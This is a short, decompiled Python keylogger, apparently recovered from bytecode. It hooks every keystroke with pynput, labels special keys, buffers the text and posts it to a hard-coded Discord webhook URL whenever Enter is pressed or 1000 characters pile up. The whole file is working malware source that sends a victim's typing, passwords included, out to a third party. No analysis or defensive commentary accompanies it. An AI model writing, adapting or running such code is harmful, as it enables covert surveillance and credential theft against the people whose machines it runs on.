# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: keylogger2.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from pynput.keyboard import Key, Listener
global text_buffer
import requests
WEBHOOK_URL = 'https://discord.com/api/webhooks/1311978305704034336/2qwGDDSAVKqMNRGf90yBRVh-fEkgaxZMhyG4L2s2JlV6TBdKi5-JOI2Nxeua5GeRpZGy'
text_buffer = ''
keycodes = {Key.space: ' ', Key.shift: ' *SHIFT* ', Key.tab: ' *TAB* ', Key.backspace: ' *<BACKSPACE>* ', Key.esc: ' *ESC* ', Key.caps_lock: ' *CAPS LOCK* ', Key.enter: ' *ENTER* ', Key.ctrl_l: ' *CTRL* ', Key.alt_l: ' *ALT* ', Key.up: ' *UP* ', Key.down: ' *DOWN* ', Key.left: ' *LEFT* ', Key.right: ' *RIGHT* '}

def send_message_to_webhook(message):
    """Send captured keystrokes to your webhook."""
    payload = {'content': message}
    try:
        requests.post(WEBHOOK_URL, data=payload)
    except Exception as e:
        print(f'Error sending message to webhook: {e}')

def on_press(key):
    global text_buffer
    if hasattr(key, 'char') and key.char is not None:
        processed_key = key.char
    else:
        processed_key = str(key)
    for k, v in keycodes.items():
        if key == k:
            processed_key = v
            break
    text_buffer = text_buffer + processed_key
    if len(text_buffer) > 1000:
        send_message_to_webhook(text_buffer)
        text_buffer = ''
    if processed_key == ' *ENTER* ':
        send_message_to_webhook(text_buffer)
        text_buffer = ''
with Listener(on_press=on_press) as listener:
    print('Keylogger is running...')
    listener.join()